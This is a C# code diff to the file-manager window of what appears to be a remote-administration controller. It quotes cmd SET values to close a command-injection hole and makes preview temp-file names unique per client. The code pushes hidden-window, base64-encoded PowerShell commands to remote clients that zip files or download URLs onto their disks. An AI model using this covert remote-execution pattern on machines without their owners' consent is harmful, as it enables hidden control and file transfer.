@@ -13,6 +13,7 @@ public partial class FileManagerWindow : ThemedWindow
 {
     private readonly TlsServer _server;
     private readonly string    _clientId;
+    private readonly string    _tempPrefix;   // per-client prefix for preview temp files
     private readonly ObservableCollection<FileEntryVM> _entries = [];
     private readonly Stack<string> _history = new();
     private string _currentPath = "";
@@ -28,8 +29,9 @@ public partial class FileManagerWindow : ThemedWindow
     {
         InitializeComponent();
         RubberBandSelector.Enable(GridFiles);
-        _server   = server;
-        _clientId = clientId;
+        _server     = server;
+        _clientId   = clientId;
+        _tempPrefix = "sero_prev_" + string.Concat(clientId.Select(c => char.IsLetterOrDigit(c) ? c : '_')) + "_";
         TxtTitle.Text = clientLabel;
         GridFiles.ItemsSource = _entries;
 
@@ -737,7 +739,7 @@ public partial class FileManagerWindow : ThemedWindow
         ServerWindow.ReportGlobalActivity("Zip item", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Zipping '{path}' to '{dest}' on client {_clientId}...");
 
-        // Use PS encoded command — path passed via env var to avoid injection
+        // Use PS encoded command — paths quoted in SET to handle & in names/paths
         var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
         try
@@ -745,7 +747,7 @@ public partial class FileManagerWindow : ThemedWindow
             await _server.SendToClient(_clientId, new Packet
             {
                 Type = PacketType.AutoTaskShell,
-                Data = $"SET SERO_SRC={path}&& SET SERO_DST={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+                Data = $"SET \"SERO_SRC={path}\"&& SET \"SERO_DST={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
             await Task.Delay(2000);
@@ -782,7 +784,7 @@ public partial class FileManagerWindow : ThemedWindow
         ServerWindow.ReportGlobalActivity("Download URL", filename, "running");
         ServerWindow.LogGlobal($"[FM] Requesting URL download '{url}' to '{dest}' on client {_clientId}...");
 
-        // Use PS encoded command — URL via env var to avoid injection
+        // Use PS encoded command — values quoted in SET so & in URLs/paths is treated literally
         var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
         try
@@ -790,7 +792,7 @@ public partial class FileManagerWindow : ThemedWindow
             await _server.SendToClient(_clientId, new Packet
             {
                 Type = PacketType.AutoTaskShell,
-                Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+                Data = $"SET \"SERO_URL={url}\"&& SET \"SERO_OUT={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
             await Task.Delay(3000);
@@ -971,7 +973,7 @@ public partial class FileManagerWindow : ThemedWindow
             else if (isVideo)
             {
                 if (_previewTempFile != null) try { System.IO.File.Delete(_previewTempFile); } catch { }
-                _previewTempFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "sero_prev_" + Path.GetFileName(vm.Name));
+                _previewTempFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), _tempPrefix + Path.GetFileName(vm.Name));
                 await System.IO.File.WriteAllBytesAsync(_previewTempFile, bytes);
                 // Make element visible BEFORE setting source so MediaElement can measure
                 ShowPreviewPanel("video");
